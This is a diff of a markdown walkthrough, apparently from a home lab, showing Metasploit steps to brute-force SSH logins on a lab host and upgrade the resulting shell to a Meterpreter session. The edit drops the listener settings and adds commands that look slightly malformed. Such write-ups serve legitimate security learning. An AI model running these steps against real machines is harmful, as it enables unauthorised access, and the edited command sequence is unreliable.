@@ -21,6 +21,7 @@
 
 3. **Exploit with Metasploit**:
    ```
+   sudo msfconsole
    use auxiliary/scanner/ssh/ssh_login
    set RHOSTS 192.168.142.131
    set USERNAME vagrant
@@ -33,9 +34,8 @@
    ```
    use post/multi/manage/shell_to_meterpreter
    set SESSION 1
-   set LHOST 192.168.142.129
-   set LPORT 4433
-   run
+   session 1 
+   shell
    ```
    - Upgraded shell to Meterpreter session
 
